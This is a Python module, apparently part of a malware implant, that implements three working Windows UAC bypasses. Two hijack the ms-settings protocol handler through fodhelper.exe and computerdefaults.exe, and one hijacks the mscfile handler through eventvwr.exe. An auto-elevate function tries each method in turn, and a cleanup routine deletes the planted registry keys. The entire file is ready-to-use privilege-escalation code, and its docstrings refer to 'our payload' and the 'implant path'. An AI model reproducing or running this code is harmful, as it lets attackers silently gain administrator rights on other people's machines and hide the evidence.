# uac_bypass.py — UAC bypass techniques for Windows 10/11
#
# Three methods that abuse auto-elevating Microsoft binaries:
#   1. FodHelper — ms-settings protocol handler hijack
#   2. ComputerDefaults — same technique, different binary
#   3. EventViewer — mscfile protocol handler via mmc.exe
#
# Each method: set registry → launch binary → wait → clean registry

import os
import sys
import time
import winreg
import subprocess
import ctypes


def is_admin() -> bool:
    """Check if the current process is running with admin privileges.

    Returns:
        True if running elevated, False otherwise.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _get_implant_path() -> str:
    """Resolve the current implant path (handles PyInstaller frozen exe)."""
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(sys.argv[0])


# ═══════════════════════════════════════════════════════════════
# Method 1: FodHelper Bypass
# ═══════════════════════════════════════════════════════════════

def bypass_fodhelper(executable_path: str = None) -> dict:
    """UAC bypass via fodhelper.exe — ms-settings protocol hijack.

    fodhelper.exe auto-elevates and reads the ms-settings protocol
    handler from HKCU. We hijack this to launch our payload elevated.

    Args:
        executable_path: Path to executable to run elevated.
                         Defaults to current implant path.

    Returns:
        Dict with status, method, and message.
    """
    if is_admin():
        return {"status": "skip", "method": "fodhelper", "message": "Already elevated"}

    exe = executable_path or _get_implant_path()
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"

    try:
        # Create registry key with our payload
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        # Launch fodhelper (auto-elevates, reads our registry)
        subprocess.Popen(
            "fodhelper.exe",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for it to process
        time.sleep(3)

        # Clean up registry
        _clean_registry(r"Software\Classes\ms-settings")

        return {"status": "ok", "method": "fodhelper", "message": f"Launched elevated: {exe}"}

    except Exception as e:
        _clean_registry(r"Software\Classes\ms-settings")
        return {"status": "error", "method": "fodhelper", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Method 2: ComputerDefaults Bypass
# ═══════════════════════════════════════════════════════════════

def bypass_computerdefaults(executable_path: str = None) -> dict:
    """UAC bypass via computerdefaults.exe — ms-settings protocol hijack.

    Same technique as fodhelper but uses computerdefaults.exe which
    also auto-elevates and reads the ms-settings handler.

    Args:
        executable_path: Path to executable to run elevated.

    Returns:
        Dict with status, method, and message.
    """
    if is_admin():
        return {"status": "skip", "method": "computerdefaults", "message": "Already elevated"}

    exe = executable_path or _get_implant_path()
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        subprocess.Popen(
            "computerdefaults.exe",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)
        _clean_registry(r"Software\Classes\ms-settings")

        return {"status": "ok", "method": "computerdefaults", "message": f"Launched elevated: {exe}"}

    except Exception as e:
        _clean_registry(r"Software\Classes\ms-settings")
        return {"status": "error", "method": "computerdefaults", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Method 3: Event Viewer Bypass
# ═══════════════════════════════════════════════════════════════

def bypass_eventvwr(executable_path: str = None) -> dict:
    """UAC bypass via eventvwr.exe — mscfile protocol hijack.

    eventvwr.exe auto-elevates and launches mmc.exe, which reads
    the mscfile protocol handler from HKCU.

    Args:
        executable_path: Path to executable to run elevated.

    Returns:
        Dict with status, method, and message.
    """
    if is_admin():
        return {"status": "skip", "method": "eventvwr", "message": "Already elevated"}

    exe = executable_path or _get_implant_path()
    reg_path = r"Software\Classes\mscfile\Shell\Open\command"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)

        subprocess.Popen(
            "eventvwr.exe",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)
        _clean_registry(r"Software\Classes\mscfile")

        return {"status": "ok", "method": "eventvwr", "message": f"Launched elevated: {exe}"}

    except Exception as e:
        _clean_registry(r"Software\Classes\mscfile")
        return {"status": "error", "method": "eventvwr", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Auto-Elevate — try all methods
# ═══════════════════════════════════════════════════════════════

def auto_elevate(executable_path: str = None) -> dict:
    """Try all UAC bypass methods in order until one succeeds.

    Args:
        executable_path: Path to executable to run elevated.

    Returns:
        Dict with status from the first successful method,
        or error details from all failed attempts.
    """
    if is_admin():
        return {"status": "ok", "method": "none", "message": "Already running as admin"}

    methods = [
        ("fodhelper", bypass_fodhelper),
        ("computerdefaults", bypass_computerdefaults),
        ("eventvwr", bypass_eventvwr),
    ]

    errors = []
    for name, func in methods:
        result = func(executable_path)
        if result.get("status") == "ok":
            return result
        errors.append(result)

    return {
        "status": "error",
        "method": "auto_elevate",
        "message": "All UAC bypass methods failed",
        "details": errors,
    }


# ═══════════════════════════════════════════════════════════════
# Registry cleanup helper
# ═══════════════════════════════════════════════════════════════

def _clean_registry(base_path: str) -> None:
    """Recursively delete a registry key tree from HKCU.

    Args:
        base_path: Registry path under HKEY_CURRENT_USER to delete.
    """
    try:
        _delete_key_tree(winreg.HKEY_CURRENT_USER, base_path)
    except Exception:
        pass


def _delete_key_tree(hive, path: str) -> None:
    """Recursively delete a registry key and all subkeys."""
    try:
        key = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
        # Enumerate and delete subkeys first
        while True:
            try:
                subkey_name = winreg.EnumKey(key, 0)
                subkey_path = f"{path}\\{subkey_name}"
                _delete_key_tree(hive, subkey_path)
            except OSError:
                break
        winreg.CloseKey(key)
        winreg.DeleteKey(hive, path)
    except Exception:
        pass
